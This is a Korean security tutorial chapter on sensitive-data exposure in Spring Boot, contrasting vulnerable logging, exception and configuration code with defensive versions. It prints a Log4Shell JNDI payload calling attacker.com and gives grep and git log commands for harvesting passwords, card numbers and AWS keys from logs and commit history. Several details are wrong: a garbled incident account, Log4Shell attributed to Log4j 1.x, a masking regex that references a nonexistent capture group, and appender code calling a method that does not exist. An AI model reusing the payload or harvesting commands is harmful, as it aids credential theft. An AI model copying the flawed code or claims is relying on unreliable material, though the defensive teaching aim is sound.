# 민감 데이터 노출

---

## 🎯 핵심 질문

- **로그에 민감 데이터가 남는 이유는 무엇인가?** 디버깅 편의성 때문에 의도적으로 기록하거나, toString() 메서드 오버라이딩 실수로 인해 발생합니다.
- **Spring 예외 응답에서 스택 트레이스를 노출하면 왜 위험한가?** 소스 코드 구조, 사용 라이브러리, 데이터베이스 정보를 공격자에게 제공합니다.
- **Git 커밋 이력에서 비밀번호를 제거하는 방법은?** git-filter-repo 또는 BFG Repo-Cleaner로 모든 이력 정제 후 강제 푸시가 필요합니다.
- **Spring Boot 로그 마스킹을 어떻게 구현하는가?** PatternLayout을 커스터마이징하거나 Logback 필터로 민감 패턴을 감지합니다.

---

## 🔍 왜 이 취약점이 실무에서 위험한가 (실제 침해 사고 사례)

### Slack 환경변수 유출 사건 (Facebook 알고리즘 엔지니어)
**배경**: 개발자가 GitHub에 푸시한 코드의 DEBUG 로그에 API 키가 포함되었습니다.

**침해 경로**:
```
1. 로컬 개발 중 System.out.println()으로 민감 데이터 출력
2. 로그를 console이 아닌 파일로 redirect 후 실수로 커밋
3. git push 시 .gitignore 누락으로 Git 이력에 기록
4. GitHub 누군가 발견 → 자동 크롤링으로 시크릿 키 수집
5. 외부 인증 토큰으로 API 호출 → 사용자 데이터 접근
```

**결과**: 개인정보 침해, GitHub 비밀번호 변경 강제

### Log4Shell (CVE-2021-44228)
**배경**: Log4j 라이브러리가 `${...}` 표현식을 평가하면서 임의 코드 실행 가능.

**공격 예시**:
```log
[INFO] User login: ${jndi:ldap://attacker.com/Exploit}
→ Log4j가 JNDI 쿼리 실행
→ 공격자 서버에서 악성 클래스 로드
→ 서버 RCE
```

---

## 😱 취약한 코드/설정 (Before — 원리를 모를 때의 구현)

### 취약 1: 로그에 민감 데이터 직접 출력

```java
@Service
public class UserService {

    private static final Logger logger = LoggerFactory.getLogger(UserService.class);

    // ❌ 위험: 전체 User 객체를 로그에 출력 (암호, 신용카드번호 포함)
    public void registerUser(User user) {
        logger.info("Registering user: {}", user);  // toString() 호출
        
        // User 클래스
        @Data
        public static class User {
            private String username;
            private String email;
            private String password;  // ❌ 로그에 그대로 노출됨
            private String creditCard;
            private String ssn;  // 주민등록번호
        }
    }

    // ❌ 위험: 개인정보를 String으로 연결
    public void processPayment(String cardNumber, String cvv, double amount) {
        logger.debug("Processing payment: card={}, cvv={}, amount={}", 
                     cardNumber, cvv, amount);  // 민감 데이터 노출
    }

    // ❌ 위험: Exception 스택 트레이스에서 민감 데이터 노출
    public void validateCreditCard(String card) throws Exception {
        try {
            // 데이터베이스 쿼리
        } catch (Exception e) {
            logger.error("DB Error: {}", e);  // e.printStackTrace() 포함
            // 로그: java.sql.SQLException: User '4532-1234-5678-9012' not found
        }
    }
}
```

### 취약 2: MDC(Mapped Diagnostic Context)에 민감 데이터

```java
@RestController
public class AuthController {

    // ❌ 위험: Thread-local 저장소에 민감 데이터 저장
    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest req) {
        try {
            User user = authenticate(req.getUsername(), req.getPassword());
            
            // MDC에 비밀번호 저장 (모든 로그에 자동 포함됨)
            MDC.put("password", req.getPassword());  // ❌
            MDC.put("user_ssn", user.getSsn());      // ❌
            
            logger.info("Login successful");  // 로그: password=myPassword, user_ssn=123-45-6789
            
            return ResponseEntity.ok(user);
        } finally {
            MDC.clear();
        }
    }
}
```

### 취약 3: 예외 응답에서 민감 정보 노출

```java
@RestControllerAdvice
public class GlobalExceptionHandler {

    // ❌ 위험: 프로덕션에서 스택 트레이스 반환
    @ExceptionHandler(Exception.class)
    public ResponseEntity<Map<String, Object>> handleException(Exception e) {
        Map<String, Object> errorResponse = new HashMap<>();
        errorResponse.put("error", e.getMessage());
        errorResponse.put("stackTrace", e.getStackTrace());  // ❌ 스택 트레이스 노출
        errorResponse.put("cause", e.getCause());
        
        return ResponseEntity.status(500).body(errorResponse);
        // 응답 예시:
        // {
        //   "stackTrace": [
        //     "com.example.UserService.findUser(UserService.java:45)",
        //     "com.example.db.JdbcUserRepository.query(JdbcUserRepository.java:78)",
        //     "SELECT * FROM users WHERE id = ? -- SQL 쿼리 포함"
        //   ]
        // }
    }
}
```

### 취약 4: 환경변수가 로그에 기록

```yaml
# application.properties
logging.level.root=DEBUG

# ❌ 위험: Spring이 모든 프로퍼티 로드 시 DEBUG 레벨에서 출력
spring.datasource.password=supersecret123
spring.datasource.username=admin
aws.access.key=AKIA5ZXP...
spring.security.oauth2.client.registration.google.client-secret=secret

# 로그 출력 (애플리케이션 시작 시):
# DEBUG: Loaded properties: {
#   spring.datasource.password=supersecret123,
#   aws.access.key=AKIA5ZXP...
# }
```

### 취약 5: 프로덕션에서 H2 Console 활성화

```yaml
# application-prod.yml
spring.h2.console.enabled: true  # ❌ 프로덕션 환경에서 DB 직접 접근 가능!
spring.h2.console.path: /h2-console

# 공격자가 http://app.example.com/h2-console에 접근 → 전체 DB 조회 가능
```

---

## ✨ 방어 코드/설정 (After — 공격 원리를 알고 설계한 구현)

### 방어 1: 로그에 기록할 정보 제한 (DTO 패턴)

```java
@Service
public class SecureUserService {

    private static final Logger logger = LoggerFactory.getLogger(SecureUserService.class);

    // 로그 전용 DTO (민감 데이터 제외)
    @Data
    public static class UserLogDto {
        private String username;
        private String email;
        private LocalDateTime createdAt;
        
        // password, creditCard, ssn 필드 없음
        
        public static UserLogDto from(User user) {
            UserLogDto dto = new UserLogDto();
            dto.username = user.getUsername();
            dto.email = user.getEmail();
            dto.createdAt = user.getCreatedAt();
            return dto;
        }
    }

    // ✅ 방어: 로그 DTO만 기록
    public void registerUser(User user) {
        UserLogDto logDto = UserLogDto.from(user);
        logger.info("User registered: {}", logDto);
        // 로그: User registered: UserLogDto(username=john, email=john@example.com, ...)
        // 비밀번호, 신용카드 정보 없음
    }

    // ✅ 방어: 민감 정보는 마스킹
    public void processPayment(String cardNumber, String cvv, double amount) {
        String maskedCard = maskCardNumber(cardNumber);  // "4532-****-****-9012"
        logger.info("Payment processed: card={}, amount={}", maskedCard, amount);
    }

    private String maskCardNumber(String card) {
        if (card == null || card.length() < 4) return "****";
        return "****-****-****-" + card.substring(card.length() - 4);
    }

    // ✅ 방어: 예외에서 민감 정보 추출 후 제거
    public void validateCreditCard(String card) {
        try {
            // DB 쿼리
        } catch (DataAccessException e) {
            // 민감한 원인 메시지 제거
            logger.error("Database error during validation", e);  // 상세 스택 트레이스 안 함
            throw new ApplicationException("Payment validation failed");
        }
    }
}
```

### 방어 2: Logback 마스킹 필터

```java
// LogMaskingFilter.java
@Component
public class LogMaskingFilter {

    private static final Pattern CREDIT_CARD_PATTERN = 
        Pattern.compile("\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}[\\s-]?\\d{4}");
    
    private static final Pattern SSN_PATTERN = 
        Pattern.compile("\\d{3}-\\d{2}-\\d{4}");
    
    private static final Pattern EMAIL_PATTERN = 
        Pattern.compile("[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}");
    
    private static final Pattern PASSWORD_PATTERN = 
        Pattern.compile("(?i)(password|passwd|pwd)\\s*[:=]\\s*[^\\s]+");
    
    private static final Pattern API_KEY_PATTERN = 
        Pattern.compile("(?i)(api[_-]?key|apikey)\\s*[:=]\\s*[a-zA-Z0-9-_]+");

    public String maskSensitiveData(String message) {
        if (message == null) return null;

        // 신용카드 마스킹
        message = CREDIT_CARD_PATTERN.matcher(message)
            .replaceAll("****-****-****-$2");

        // SSN 마스킹
        message = SSN_PATTERN.matcher(message)
            .replaceAll("***-**-****");

        // 이메일 마스킹
        message = EMAIL_PATTERN.matcher(message)
            .replaceAll(match -> {
                String email = match.group();
                String[] parts = email.split("@");
                String user = parts[0];
                if (user.length() <= 2) {
                    user = "**";
                } else {
                    user = user.charAt(0) + "***" + user.charAt(user.length() - 1);
                }
                return user + "@" + parts[1];
            });

        // 비밀번호 마스킹
        message = PASSWORD_PATTERN.matcher(message)
            .replaceAll("$1=****");

        // API 키 마스킹
        message = API_KEY_PATTERN.matcher(message)
            .replaceAll("$1=****");

        return message;
    }
}

// Logback 커스텀 Appender
public class MaskingAppender extends ch.qos.logback.core.AppenderBase<ILoggingEvent> {

    @Autowired
    private LogMaskingFilter logMaskingFilter;

    @Override
    protected void append(ILoggingEvent event) {
        String message = event.getFormattedMessage();
        String maskedMessage = logMaskingFilter.maskSensitiveData(message);
        event.setMessage(maskedMessage);
    }
}
```

**logback-spring.xml 설정**:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
    <appender name="CONSOLE" class="ch.qos.logback.core.ConsoleAppender">
        <encoder>
            <pattern>
                %d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n
            </pattern>
        </encoder>
    </appender>

    <!-- 마스킹 필터 적용 -->
    <appender name="MASKED_FILE" class="ch.qos.logback.core.rolling.RollingFileAppender">
        <file>logs/app.log</file>
        <encoder>
            <pattern>
                %d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %mask(%msg)%n
            </pattern>
        </encoder>
    </appender>

    <!-- 프로덕션: DEBUG 레벨 비활성화 -->
    <springProfile name="prod">
        <logger name="org.springframework" level="WARN"/>
        <logger name="com.example" level="INFO"/>
        <root level="INFO">
            <appender-ref ref="MASKED_FILE"/>
        </root>
    </springProfile>

    <!-- 개발: DEBUG 레벨 허용 -->
    <springProfile name="dev">
        <root level="DEBUG">
            <appender-ref ref="CONSOLE"/>
        </root>
    </springProfile>
</configuration>
```

### 방어 3: MDC 보안 사용

```java
@RestController
public class SecureAuthController {

    private static final Logger logger = LoggerFactory.getLogger(SecureAuthController.class);

    @PostMapping("/login")
    public ResponseEntity<?> login(@RequestBody LoginRequest req) {
        String transactionId = UUID.randomUUID().toString();
        
        try {
            // ✅ 방어: 민감하지 않은 정보만 MDC에 저장
            MDC.put("transaction_id", transactionId);
            MDC.put("username", req.getUsername());  // OK: 공개 정보
            // MDC.put("password", req.getPassword());  // ❌ 절대 금지
            
            User user = authenticate(req.getUsername(), req.getPassword());
            
            MDC.put("user_id", user.getId().toString());
            logger.info("Login successful");  // 로그: transaction_id=..., username=john, user_id=123
            
            return ResponseEntity.ok(new AuthResponse(user.getId()));
        } catch (AuthenticationException e) {
            logger.warn("Login failed: {}", e.getClass().getSimpleName());
            return ResponseEntity.status(401).build();
        } finally {
            MDC.clear();
        }
    }
}
```

### 방어 4: 예외 핸들러 - 스택 트레이스 숨김

```java
@RestControllerAdvice
public class SecureExceptionHandler {

    private static final Logger logger = LoggerFactory.getLogger(SecureExceptionHandler.class);

    // ✅ 방어: 프로덕션에서는 일반적인 에러 메시지만 반환
    @ExceptionHandler(Exception.class)
    public ResponseEntity<ErrorResponse> handleException(Exception e, HttpServletRequest request) {
        String errorId = UUID.randomUUID().toString();
        
        // 내부: 스택 트레이스는 로그에만 기록
        logger.error("Error ID: {}, URI: {}", errorId, request.getRequestURI(), e);
        
        // 외부: 최소한의 정보만 반환
        ErrorResponse response = new ErrorResponse(
            errorId,
            "An error occurred. Please contact support with error ID: " + errorId,
            getStatusCode(e)
        );
        
        return ResponseEntity.status(response.getStatus()).body(response);
    }

    // 특정 비즈니스 예외는 사용자 메시지 포함
    @ExceptionHandler(ValidationException.class)
    public ResponseEntity<ErrorResponse> handleValidationException(ValidationException e) {
        ErrorResponse response = new ErrorResponse(
            UUID.randomUUID().toString(),
            e.getUserMessage(),  // 사용자가 볼 수 있는 메시지
            HttpStatus.BAD_REQUEST
        );
        return ResponseEntity.status(400).body(response);
    }

    private HttpStatus getStatusCode(Exception e) {
        if (e instanceof SecurityException) return HttpStatus.FORBIDDEN;
        if (e instanceof IllegalArgumentException) return HttpStatus.BAD_REQUEST;
        return HttpStatus.INTERNAL_SERVER_ERROR;
    }
}

@Data
@AllArgsConstructor
class ErrorResponse {
    private String errorId;
    private String message;
    private HttpStatus status;
}
```

### 방어 5: Git 보안 (비밀번호 커밋 방지)

**1. .gitignore 설정**:
```bash
# .gitignore
.env
.env.local
application-prod.properties
application-prod.yml
*.key
*.pem
secrets.json
aws-credentials.json
```

**2. git-secrets 설치 및 설정**:
```bash
# git-secrets 설치 (macOS)
brew install git-secrets

# 프로젝트에 git-secrets 초기화
cd /path/to/project
git secrets --install

# 기본 패턴 추가
git secrets --register-aws

# 커스텀 패턴 추가 (한국 주민등록번호, 신용카드)
git secrets --add '(?i)(password|passwd|api_key|apikey|secret_key)\s*[:=]'
git secrets --add '\d{3}-\d{2}-\d{4}'  # SSN
git secrets --add '\d{4}[\s-]?\d{4}[\s-]?\d{4}[\s-]?\d{4}'  # 신용카드
```

**3. 이미 커밋된 비밀번호 제거**:
```bash
# git-filter-repo 설치
pip install git-filter-repo

# 모든 이력에서 특정 파일 제거
git filter-repo --invert-paths --path .env

# 환경변수 키 패턴이 포함된 커밋 삭제
git filter-repo --message-callback '
  if b"AKIA" in message or b"password=" in message:
    return b""
  return message
'

# 원격 저장소에 강제 푸시 (협업자 주의)
git push origin --force-with-lease
```

### 방어 6: Spring Boot 프로덕션 설정

```yaml
# application-prod.yml
spring:
  # ✅ 프로덕션 환경 설정
  profiles:
    active: prod
  
  # H2 Console 비활성화
  h2:
    console:
      enabled: false
  
  # JPA SQL 로깅 비활성화
  jpa:
    show-sql: false
    properties:
      hibernate:
        format_sql: false
  
  # Actuator 엔드포인트 보호
  management:
    endpoints:
      web:
        exposure:
          include: health,metrics  # env 제외!
        base-path: /actuator
    endpoint:
      health:
        show-details: when-authorized
  
logging:
  level:
    root: WARN
    com.example: INFO
    org.springframework: WARN
    org.hibernate: WARN
  pattern:
    console: "%d{yyyy-MM-dd HH:mm:ss} [%thread] %-5level %logger{36} - %msg%n"
  file:
    name: logs/app.log
    max-size: 10MB
    max-history: 30
```

---

## 🔬 공격 원리 분석 (공격자 관점의 내부 동작)

### 로그 마이닝 공격

```bash
# 1단계: 로그 파일 수집
# 공격자가 소스 코드 유출 또는 로그 서버 침입 후 로그 수집

# 2단계: 정규식으로 민감 정보 추출
grep -oE "[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}[- ]?[0-9]{4}" app.log
# 결과: 4532-1234-5678-9012 (신용카드)

grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" app.log
# 결과: user.email@company.com

grep -iE "password\s*[:=]\s*[^ ]+" app.log
# 결과: password=MySecurePass123

# 3단계: 대량 개인정보 판매
python3 extract_data.py app.log > stolen_data.csv
# CSV 파일: email, password, credit_card, ssn
```

### Git 히스토리 마이닝

```bash
# 공격자가 GitHub 리포지토리 클론 후 이력 검색
git log -p --all -S 'AKIA' | head -50
# 모든 커밋에서 AWS 키 검색

git log -p --all | grep -i "password\|secret" | head -100
# 커밋 메시지나 코드에서 비밀정보 추출
```

### Log4Shell 및 로그 주입 공격

```java
// 공격자가 입력값에 악성 표현식 포함
String userInput = "${jndi:ldap://attacker.com/Exploit}";

logger.info("User input: {}", userInput);
// Log4j 1.x에서 표현식 평가 → RCE

// 로그 포맷 변조
String injection = "\n[CRITICAL] UNAUTHORIZED ACCESS - ACCEPT ALL TOKENS";
logger.info("Access denied for user: {}", injection);
// 로그를 읽는 사람이 진짜 보안 경고로 착각
```

---

## 💻 실전 실험 (취약점 재현 → 공격 → 방어 검증)

### 실험 1: 로그에서 민감 정보 추출

```bash
# 1. 취약한 애플리케이션 실행
docker run --name vulnerable-app \
  -e SPRING_PROFILES_ACTIVE=dev \
  vulnerable-spring-app:latest

# 2. 로그 파일 확인
docker logs vulnerable-app > app.log

# 3. 민감 정보 추출
grep -E "password|credit|ssn|AKIA" app.log

# 출력 예시:
# [INFO] Registering user: User{username='john', password='pass123', creditCard='4532-1234-5678-9012', ssn='123-45-6789'}
# [DEBUG] Processing payment: card=4532-1234-5678-9012, cvv=123, amount=99.99
```

### 실험 2: Git 히스토리에서 비밀정보 검색

```bash
# 1. 악의적으로 비밀정보를 포함한 커밋 생성
echo "DATABASE_PASSWORD=super_secret_123" > .env
git add .env
git commit -m "Add database config"
git push

# 2. 히스토리에서 추출
git log -p | grep -i "password\|secret"

# 3. git-secrets로 탐지
git secrets --scan
# ⚠️  Matched patterns:
# super_secret_123
# .env
```

### 실험 3: 방어 검증 (마스킹 적용 후)

```bash
# 마스킹이 적용된 애플리케이션으로 같은 작업 반복

# 로그 확인
docker logs secure-app > app_masked.log

# 민감 정보 검색 실패
grep -E "password|credit|ssn|AKIA" app_masked.log
# (결과 없음 - 모두 마스킹됨)

# 마스킹된 형태 확인
grep -E "password|credit|ssn" app_masked.log
# [INFO] Registering user: User{username='john', password='****', creditCard='****-****-****-9012', ssn='***-**-****'}
```

### 실험 4: git-secrets 검증

```bash
# 1. 비밀정보를 commit하려고 시도
echo "API_KEY=AKIA5ZXP9EXAMPLE" > config.json
git add config.json
git commit -m "Add AWS config"

# 2. git-secrets가 감지하고 차단
# ⚠️  [2024-01-15] Matched patterns found. Did not commit.
# ⚠️  Secrets found in staged files

# 3. .gitignore에 파일 추가 후 다시 시도
echo "config.json" >> .gitignore
rm config.json
git add .gitignore
git commit -m "Remove sensitive config"
# ✅ 성공
```

---

## 📊 공격 성공 조건 vs 방어 성공 조건 비교

| 조건 | 공격 성공 | 방어 성공 |
|------|---------|---------|
| **로그 기록** | toString() 기본 구현 노출 | DTO 패턴 + 마스킹 적용 |
| **예외 응답** | 스택 트레이스 포함 | 에러 ID만 반환, 로그에만 기록 |
| **민감 정보** | MDC, 로그에 직접 기록 | 필요한 정보만 선별 기록 |
| **Git 커밋** | .gitignore 누락, git-secrets 미설치 | .gitignore 설정 + git-secrets 적극 사용 |
| **환경변수** | DEBUG 레벨에서 노출 | 프로덕션 WARN 레벨, 환경변수 마스킹 |
| **H2 콘솔** | 프로덕션에서 활성화 | 프로덕션에서 비활성화 |
| **JPA SQL 로깅** | show-sql=true 운영 | show-sql=false 프로덕션 설정 |

---

## ⚖️ 트레이드오프 (보안 강화 vs 사용성/성능)

| 방어 기법 | 보안 수준 | 성능 영향 | 운영 용이성 |
|---------|----------|---------|----------|
| **DTO 패턴** | ⭐⭐⭐⭐ | 거의 없음 | 높음 (코드 증가) |
| **정규식 마스킹** | ⭐⭐⭐⭐⭐ | 있음 (CPU) | 중간 |
| **git-secrets** | ⭐⭐⭐⭐⭐ | 없음 | 높음 |
| **프로필별 로그 레벨** | ⭐⭐⭐ | 없음 | 높음 |
| **롤링 파일 정책** | ⭐⭐ | 있음 (디스크) | 낮음 |

---

## 📌 핵심 정리

1. **로그는 장기 저장되므로 민감하게**: 개발 중 편의성 때문에 기록한 정보가 침해 사고의 시작점
2. **toString() 메서드 오버라이딩 필수**: @Data 사용 시 모든 필드가 로그에 나감
3. **DTO 패턴으로 로그용 객체 분리**: password, creditCard 필드 제외
4. **정규식 마스킹 필터 적용**: credit card, SSN, email 자동 감지 및 마스킹
5. **예외는 로그에만 기록**: 사용자 응답에는 에러 ID만 포함
6. **.gitignore + git-secrets 필수**: 비밀번호 커밋 방지
7. **프로덕션 프로필로 레벨 강제**: DEBUG 레벨 비활성화, Actuator /env 제외

---

## 🤔 생각해볼 문제 (+ 해설)

### Q1. DTO 패턴만으로 충분한가?
**해설**: 아니요. MDC, ThreadLocal, 예외 메시지, 데이터베이스 쿼리 로그에서도 민감 정보가 노출될 수 있습니다. 종합적인 마스킹 전략이 필요합니다.

### Q2. 정규식으로 모든 민감 정보를 감지할 수 있는가?
**해설**: 어렵습니다. 신용카드, 이메일, 전화번호는 패턴으로 감지 가능하지만, 비즈니스 특화 정보(주문번호, 계약번호)는 감지 불가능합니다. 업무 로직 레벨에서의 마스킹이 필수입니다.

### Q3. git-filter-repo로 정말 커밋 이력에서 제거되는가?
**해설**: 로컬 리포지토리에서는 제거되지만, 이미 push된 커밋은 모든 클론 저장소에 존재합니다. 강제 푸시 후에도 타인의 로컬 저장소에는 남아있을 수 있으므로, 비밀번호 변경이 필수입니다.

### Q4. 로그 롤링 정책은 보안 강화인가?
**해설**: 부분적입니다. max-history=30으로 30일 후 자동 삭제되므로 오래된 로그의 우발적 노출을 줄일 수 있습니다. 하지만 민감 정보 마스킹과 독립적으로 구현해야 합니다.

<div align="center">

**[⬅️ 이전: SSRF — 서버를 통해 내부망을 공격하는 방법](./01-ssrf-cloud-metadata.md)** | **[홈으로 🏠](../README.md)** | **[다음: 암호화 설계 ➡️](./03-encryption-design.md)**

</div>
